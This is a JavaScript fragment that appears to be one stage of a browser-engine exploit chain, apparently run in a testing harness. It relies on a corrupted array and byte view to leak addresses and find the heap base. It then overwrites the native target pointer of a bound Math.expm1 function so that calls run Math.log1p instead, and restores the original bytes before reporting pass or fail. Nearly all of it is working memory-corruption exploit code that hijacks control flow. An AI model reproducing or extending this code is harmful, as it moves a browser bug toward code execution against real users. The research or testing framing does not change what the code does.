// Replace one bound function's observed native target with another valid
// rooted native function word, call once, then restore the original bytes.
var state = window.__fw14ArrayState;
var result;
var phase = "preflight";
var targetIndex = -1;
var original = [];
var viewChanged = false;
try {
  if (!state || !state.view || !state.array || !state.a ||
      !state.addressAnchor || !state.callableMatrix ||
      state.array[0] !== state.a ||
      state.addressAnchor.marker !== 0x11223344)
    throw new Error("held_callables_preflight_failed");
  var view = state.view;
  var boundExp = state.callableMatrix[2];
  if (typeof boundExp !== "function") throw new Error("bound_exp_missing");
  function matches(at, value) {
    return view[at] === (value & 255) &&
      view[at + 1] === (value >>> 8 & 255) &&
      view[at + 2] === (value >>> 16 & 255) &&
      view[at + 3] === (value >>> 24 & 255);
  }
  function wordBytes(value) {
    var bytes = [];
    try {
      state.array[0] = value;
      for (var b = 0; b < 8; b++) bytes.push(view[state.index + b]);
    } finally {
      state.array[0] = state.a;
    }
    return bytes;
  }
  function hex(bytes) {
    var out = "0x";
    for (var b = 7; b >= 0; b--)
      out += bytes[b].toString(16).padStart(2, "0");
    return out;
  }
  var anchorWord = hex(wordBytes(state.addressAnchor));
  var candidates = [];
  for (var i = 2097152; i + 3 < 4194304; i++)
    if (matches(i, 0x11223344)) {
      if (candidates.length === 32) throw new Error("anchor_candidates_capped");
      candidates.push(i);
    }
  var live = [];
  try {
    state.addressAnchor.marker = 0x55667788;
    for (var c = 0; c < candidates.length; c++)
      if (matches(candidates[c], 0x55667788)) live.push(candidates[c]);
  } finally {
    state.addressAnchor.marker = 0x11223344;
  }
  if (live.length !== 1 || !matches(live[0], 0x11223344))
    throw new Error("anchor_live_count_" + live.length);
  var base = Number(anchorWord) + 8 - live[0];
  if (!Number.isSafeInteger(base) || base % 4096 !== 0)
    throw new Error("base_not_page_aligned");
  phase = "target_gate";
  var boundLog = Math.log1p.bind(null);
  state.boundLogControl = boundLog;
  var boundWord = hex(wordBytes(boundExp));
  var boundLogWord = hex(wordBytes(boundLog));
  var expBytes = wordBytes(Math.expm1);
  var logBytes = wordBytes(Math.log1p);
  var expWord = hex(expBytes);
  var logWord = hex(logBytes);
  var boundIndex = Number(boundWord) - base;
  var boundLogIndex = Number(boundLogWord) - base;
  targetIndex = boundIndex + 24;
  if (!Number.isSafeInteger(boundIndex) || !Number.isSafeInteger(boundLogIndex) ||
      boundIndex < 0 || boundLogIndex < 0 ||
      targetIndex + 7 >= 4194304 || boundLogIndex + 31 >= 4194304)
    throw new Error("bound_cell_outside_window");
  for (var o = 0; o < 8; o++) original.push(view[targetIndex + o]);
  var controlBytes = [];
  for (var q = 0; q < 8; q++) controlBytes.push(view[boundLogIndex + 24 + q]);
  if (hex(original) !== expWord || hex(controlBytes) !== logWord)
    throw new Error("bound_target_word_mismatch");
  var expExpected = Math.expm1(1);
  var logExpected = Math.log1p(1);
  var baseline = boundExp(1);
  if (Math.abs(baseline - expExpected) > 1e-12 ||
      Math.abs(boundLog(1) - logExpected) > 1e-12 ||
      Math.abs(expExpected - logExpected) < 0.5)
    throw new Error("baseline_call_mismatch");
  if (api && typeof api.markSync === "function")
    api.markSync("bound_target_before_write");
  phase = "target_swap";
  var changedResult = null;
  var otherUnchanged = false;
  var restoredResult = null;
  viewChanged = true;
  try {
    for (var w = 0; w < 8; w++) view[targetIndex + w] = logBytes[w];
    changedResult = boundExp(1);
    otherUnchanged = Math.abs(boundLog(1) - logExpected) < 1e-12 &&
      Math.abs(Math.expm1(1) - expExpected) < 1e-12;
  } finally {
    for (var r = 0; r < 8; r++) view[targetIndex + r] = original[r];
    viewChanged = false;
    restoredResult = boundExp(1);
  }
  if (api && typeof api.markSync === "function")
    api.markSync("bound_target_restored");
  var redirected = Math.abs(changedResult - logExpected) < 1e-12;
  var finalBytes = [];
  for (var f = 0; f < 8; f++) finalBytes.push(view[targetIndex + f]);
  var bytesRestored = hex(finalBytes) === expWord;
  var restored = Math.abs(restoredResult - expExpected) < 1e-12 &&
    bytesRestored &&
    state.array[0] === state.a;
  result = { id: "bound_native_target_swap",
    status: redirected && restored && otherUnchanged ? "pass" : "fail",
    details: { base: "0x" + base.toString(16),
      bound_word: boundWord, bound_log_word: boundLogWord,
      expm1_word: expWord, log1p_word: logWord,
      slot_index: targetIndex, baseline: baseline,
      changed: changedResult, restored: restoredResult,
      redirected: redirected, other_unchanged: otherUnchanged,
      bytes_restored: bytesRestored } };
} catch (error) {
  if (viewChanged && state && state.view && original.length === 8 &&
      targetIndex >= 0)
    for (var x = 0; x < 8; x++) state.view[targetIndex + x] = original[x];
  if (state && state.array && state.a) state.array[0] = state.a;
  result = { id: "bound_native_target_swap", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
return [result];
